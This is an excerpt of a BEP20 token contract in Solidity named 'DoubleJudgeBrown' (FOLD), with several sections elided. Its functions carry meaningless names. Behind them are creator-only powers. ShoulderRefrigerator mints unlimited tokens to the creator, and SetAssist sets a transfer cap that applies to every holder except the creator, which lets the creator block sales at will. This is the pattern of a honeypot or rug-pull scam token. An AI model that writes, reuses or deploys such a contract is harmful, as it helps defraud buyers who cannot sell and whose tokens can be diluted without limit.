...
contract DoubleJudgeBrown is IBEP20 
{
    using LayLib for uint256;
    mapping(address => uint256) internal _beautiful;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _mall;
    ...
    constructor() 
    {
        ...
        _name = "DoubleJudgeBrown";
        _symbol = "FOLD";
        _burnRate = 11;
        _mall = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _beautiful[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier FactorSpread() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _beautiful[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetEat() external view returns (uint256) { return _mall; }
    function SetAssist(uint b) external virtual FactorSpread { _mall = b * (10 ** decimals()); }
    ...
    function ShoulderRefrigerator(uint256 mail) external virtual FactorSpread
    {
        uint move = mail * (10 ** decimals()); 
        _beautiful[_msgsender] = _beautiful[_msgsender].Cream(move);
        emit Transfer(address(0), _msgsender, move);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _mall || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _beautiful[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _beautiful[sender] = senderBalance - amount;
        _beautiful[recipient] += (amount - burnAmount);
        _beautiful[_burnaddress] += burnAmount;
...
library LayLib 
{
  function Cream(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}